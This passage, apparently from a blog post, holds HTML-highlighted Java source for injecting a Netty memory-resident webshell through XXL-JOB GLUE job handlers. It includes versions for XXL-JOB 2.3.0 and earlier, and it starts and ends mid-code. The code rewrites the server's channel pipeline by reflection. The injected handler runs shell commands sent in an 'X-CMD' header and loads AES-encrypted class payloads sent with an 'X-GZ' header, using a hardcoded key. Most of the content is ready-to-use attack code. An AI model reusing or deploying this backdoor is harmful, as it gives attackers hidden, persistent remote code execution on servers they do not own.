com.xxl.job.core.log.XxlJobLogger;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.model.ReturnT;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyThreadHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelDuplexHandler</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5str(pass + xc);</span><br><span class="line">        <span class="keyword">private</span> Class <span class="title function_">defClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>],Thread.currentThread().getContextClassLoader());</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> (Class) method.invoke(urlClassLoader,classbytes,<span class="number">0</span>,classbytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">md5str</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.MessageDigest m;</span><br><span class="line">                m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">                ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ThreadLocal&lt;AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt;&gt; requestThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span>   Class payload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> HttpRequest)&#123;</span><br><span class="line">                <span class="type">HttpRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpRequest) msg;</span><br><span class="line">                AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry = <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry(httpRequest,<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>());</span><br><span class="line">                requestThreadLocal.set(simpleEntry);</span><br><span class="line">                <span class="keyword">if</span>(httpRequest.headers().contains(<span class="string">&quot;X-CMD&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpRequest.headers().get(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">execResult</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ArrayList&lt;String&gt; cmdList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    cmdList.add(cmd);</span><br><span class="line">                    String[] cmds = cmdList.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds).start();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        execResult =execResult+line;</span><br><span class="line">                    &#125;</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    send(ctx, execResult, HttpResponseStatus.OK);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (httpRequest.headers().contains(<span class="string">&quot;X-GZ&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">HttpContent</span> <span class="variable">httpContent</span> <span class="operator">=</span> (HttpContent)msg;</span><br><span class="line">                    AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry1 = requestThreadLocal.get();</span><br><span class="line">                    <span class="keyword">if</span> (simpleEntry1 == <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">HttpRequest</span> <span class="variable">httpRequest1</span> <span class="operator">=</span> simpleEntry1.getKey();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">contentBuf</span> <span class="operator">=</span> simpleEntry1.getValue();</span><br><span class="line"></span><br><span class="line">                    <span class="type">ByteBuf</span> <span class="variable">byteBuf</span> <span class="operator">=</span> httpContent.content();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> byteBuf.capacity();</span><br><span class="line">                    <span class="type">byte</span>[] requestContent = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">                    byteBuf.getBytes(<span class="number">0</span>,requestContent,<span class="number">0</span>,requestContent.length);</span><br><span class="line"></span><br><span class="line">                    contentBuf.write(requestContent);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (httpContent <span class="keyword">instanceof</span> LastHttpContent)&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">byte</span>[] data =  x(contentBuf.toByteArray(), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (payload == <span class="literal">null</span>) &#123;</span><br><span class="line">                                payload = defClass(data);</span><br><span class="line">                                gzsend(ctx,x(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payload.newInstance();</span><br><span class="line">                                java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                                f.equals(arrOut);</span><br><span class="line">                                f.equals(data);</span><br><span class="line">                                f.toString();</span><br><span class="line">                                gzsend(ctx,x(arrOut.toByteArray(), <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                            ctx.fireChannelRead(httpRequest1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ctx.fireChannelRead(msg);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ctx.fireChannelRead(msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ctx.fireChannelRead(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">gzsend</span><span class="params">(ChannelHandlerContext ctx, <span class="type">byte</span>[] context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> ExecutorBiz executorBiz;</span><br><span class="line">    <span class="keyword">private</span> String accessToken;</span><br><span class="line">    <span class="keyword">private</span> Thread thread;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ReturnT&lt;String&gt; <span class="title function_">execute</span><span class="params">(String param)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        XxlJobLogger.log(<span class="string">&quot;XXL-JOB, Hello World.&quot;</span>);</span><br><span class="line">        executorBiz = <span class="keyword">new</span> <span class="title class_">ExecutorBizImpl</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">bossGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">bizThreadPool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">200</span>,</span><br><span class="line">                <span class="number">60L</span>,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;(<span class="number">2000</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ThreadFactory</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Thread <span class="title function_">newThread</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(r, <span class="string">&quot;xxl-rpc, EmbedServer bizThreadPool-&quot;</span> + r.hashCode());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">RejectedExecutionHandler</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rejectedExecution</span><span class="params">(Runnable r, ThreadPoolExecutor executor)</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;xxl-job, EmbedServer bizThreadPool is EXHAUSTED!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">group</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threads</span> <span class="operator">=</span> group.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] allThreads = (Thread[]) threads.get(group);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : allThreads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;nioEventLoopGroup&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object target;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            target = getFieldValue(getFieldValue(getFieldValue(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;runnable&quot;</span>), <span class="string">&quot;val\$eventExecutor&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (target.getClass().getName().endsWith(<span class="string">&quot;NioEventLoop&quot;</span>)) &#123;</span><br><span class="line">                            XxlJobLogger.log(<span class="string">&quot;NioEventLoop find&quot;</span>);</span><br><span class="line">                            <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> (HashSet) getFieldValue(getFieldValue(target, <span class="string">&quot;unwrappedSelector&quot;</span>), <span class="string">&quot;keys&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (!set.isEmpty()) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">keys</span> <span class="operator">=</span> set.toArray()[<span class="number">0</span>];</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">pipeline</span> <span class="operator">=</span> getFieldValue(getFieldValue(keys, <span class="string">&quot;attachment&quot;</span>), <span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">aggregator</span> <span class="operator">=</span> getFieldValue(getFieldValue(getFieldValue(pipeline, <span class="string">&quot;head&quot;</span>), <span class="string">&quot;next&quot;</span>), <span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                                setFieldValue(aggregator, <span class="string">&quot;childHandler&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                                    <span class="meta">@Override</span></span><br><span class="line">                                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel channel)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                        channel.pipeline()</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">IdleStateHandler</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span> * <span class="number">3</span>, TimeUnit.SECONDS))  <span class="comment">// beat 3N, close if idle</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpServerCodec</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpObjectAggregator</span>(<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>))  <span class="comment">// merge request &amp; reponse to FULL</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">NettyThreadHandler</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">EmbedServer</span>.EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">                                XxlJobLogger.log(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                        XxlJobLogger.log(ignored.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            XxlJobLogger.log(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ReturnT.SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="2-3-0"><a href="#2-3-0" class="headerlink" title="2.3.0"></a>2.3.0</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.executor.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.ExecutorBiz;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.impl.ExecutorBizImpl;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.server.EmbedServer;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.http.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.timeout.IdleStateHandler;</span><br><span class="line"><span class="keyword">import</span> io.netty.util.CharsetUtil;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.model.ReturnT;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ExecutorBiz executorBiz;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">accessToken</span> <span class="operator">=</span> <span class="string">&quot;XXL-JOB-ACCESS-TOKEN&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> Thread thread;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        executorBiz = <span class="keyword">new</span> <span class="title class_">ExecutorBizImpl</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">bossGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">bizThreadPool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">200</span>,</span><br><span class="line">                <span class="number">60L</span>,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;(<span class="number">2000</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ThreadFactory</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Thread <span class="title function_">newThread</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(r, <span class="string">&quot;xxl-rpc, EmbedServer bizThreadPool-&quot;</span> + r.hashCode());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">RejectedExecutionHandler</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rejectedExecution</span><span class="params">(Runnable r, ThreadPoolExecutor executor)</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;xxl-job, EmbedServer bizThreadPool is EXHAUSTED!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">group</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threads</span> <span class="operator">=</span> group.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] allThreads = (Thread[]) threads.get(group);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : allThreads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;nioEventLoopGroup&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object target;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            target = getFieldValue(getFieldValue(getFieldValue(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;runnable&quot;</span>), <span class="string">&quot;val\$eventExecutor&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (target.getClass().getName().endsWith(<span class="string">&quot;NioEventLoop&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> (HashSet) getFieldValue(getFieldValue(target, <span class="string">&quot;unwrappedSelector&quot;</span>), <span class="string">&quot;keys&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (!set.isEmpty()) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">keys</span> <span class="operator">=</span> set.toArray()[<span class="number">0</span>];</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">pipeline</span> <span class="operator">=</span> getFieldValue(getFieldValue(keys, <span class="string">&quot;attachment&quot;</span>), <span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">aggregator</span> <span class="operator">=</span> getFieldValue(getFieldValue(getFieldValue(pipeline, <span class="string">&quot;head&quot;</span>), <span class="string">&quot;next&quot;</span>), <span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                                setFieldValue(aggregator, <span class="string">&quot;childHandler&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                                    <span class="meta">@Override</span></span><br><span class="line">                                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel channel)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                        channel.pipeline()</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">IdleStateHandler</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span> * <span class="number">3</span>, TimeUnit.SECONDS))  <span class="comment">// beat 3N, close if idle</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpServerCodec</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpObjectAggregator</span>(<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>))  <span class="comment">// merge request &amp; reponse to FULL</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">NettyThreadHandler</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">EmbedServer</span>.EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                    &#125;</span><br><span 